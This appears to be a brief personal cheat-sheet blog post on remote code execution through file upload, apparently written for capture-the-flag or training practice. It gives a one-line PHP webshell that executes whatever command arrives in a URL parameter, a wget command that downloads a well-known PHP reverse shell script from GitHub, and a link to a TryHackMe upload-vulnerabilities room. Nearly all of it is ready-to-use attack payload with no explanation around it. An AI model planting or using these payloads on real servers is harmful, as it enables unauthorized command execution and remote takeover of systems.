---
layout: post
title: "rce"
keywords: "remote code execution, file upload"
---
#### PHP Webshell
```
<?php echo system($_GET["cmd"]); ?>
```

#### PHP Reverse Shell
```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

#### JS Response Editing & Magic Bytes
[https://tryhackme.com/room/uploadvulns](https://tryhackme.com/room/uploadvulns)